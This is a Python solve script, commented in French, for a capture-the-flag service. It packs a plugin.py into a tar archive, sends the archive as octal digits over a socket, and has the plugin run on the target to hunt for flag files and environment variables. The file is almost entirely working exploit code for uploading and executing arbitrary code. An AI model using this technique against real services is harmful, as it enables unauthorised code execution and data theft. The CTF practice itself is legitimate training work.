#!/usr/bin/env python3
# sol.py
import argparse, io, os, re, socket, tarfile, time

HOST_DEFAULT = "ctf.ac.upt.ro"
PORT_DEFAULT = 9993

PLUGIN_CODE = r'''
# plugin.py exécuté côté cible
import os, re

def _try_read(path):
    try:
        with open(path, "rb") as f:
            data = f.read(65536)
        m = re.search(rb'ctf\{[^}\n]{0,500}\}', data, re.I)
        if m:
            print(m.group(0).decode(errors="ignore"))
            return True
    except Exception:
        pass
    return False

def run():
    # chemins courants en CTF
    candidates = [
        "/flag", "/flag.txt",
        "/home/ctf/flag", "/home/ctf/flag.txt",
        "flag", "flag.txt",
        "/app/flag", "/app/flag.txt",
        "/var/flag", "/var/flag.txt",
    ]
    for p in candidates:
        if _try_read(p):
            return

    # parfois FLAG=ctf{...} en variable d'env
    try:
        for k,v in os.environ.items():
            if "FLAG" in k.upper() or "CTF" in k.upper():
                m = re.search(r'ctf\{[^}\n]{0,500}\}', str(v), re.I)
                if m:
                    print(m.group(0))
                    return
    except Exception:
        pass

    # fallback: chercher des fichiers nommés "flag*"
    for root in ("/", "/home", "/app", "/var", "."):
        try:
            for name in os.listdir(root):
                if name.lower().startswith("flag"):
                    if _try_read(os.path.join(root, name)):
                        return
        except Exception:
            pass

    print("no flag found")
'''

def build_tar_with_plugin() -> bytes:
    bio = io.BytesIO()
    # IMPORTANT : pas de "w:ustar" (ce n'est pas une compression) ; juste "w".
    # On peut préciser le format USTAR pour une compat maximale.
    with tarfile.open(fileobj=bio, mode="w", format=tarfile.USTAR_FORMAT) as tf:
        payload = PLUGIN_CODE.encode()
        info = tarfile.TarInfo(name="plugin.py")
        info.size = len(payload)
        info.mtime = int(time.time())
        info.mode = 0o644
        tf.addfile(info, io.BytesIO(payload))
    return bio.getvalue()

def to_octal_triplets(data: bytes) -> str:
    # chaque octet -> 3 chiffres octaux (000..377 en base 8)
    return "".join(f"{b:03o}" for b in data)

def send_to_remote(host: str, port: int, octal_line: str, timeout: float = 5.0) -> str:
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        # lire éventuelle bannière
        try:
            _ = s.recv(4096)
        except Exception:
            pass
        s.sendall(octal_line.encode() + b"\n")
        chunks = []
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except Exception:
            pass
        return b"".join(chunks).decode(errors="ignore")

def main():
    ap = argparse.ArgumentParser(description="Exploit octal → tar → plugin.py")
    ap.add_argument("--host", default=HOST_DEFAULT, help="hôte (défaut: ctf.ac.upt.ro)")
    ap.add_argument("--port", type=int, default=PORT_DEFAULT, help="port (défaut: 9993)")
    ap.add_argument("--print-only", action="store_true",
                    help="n’envoie pas ; affiche la chaîne octale à coller dans nc")
    args = ap.parse_args()

    tar_bytes = build_tar_with_plugin()
    octal_line = to_octal_triplets(tar_bytes)

    if args.print_only:
        print(octal_line)
    else:
        out = send_to_remote(args.host, args.port, octal_line)
        print(out)

if __name__ == "__main__":
    main()
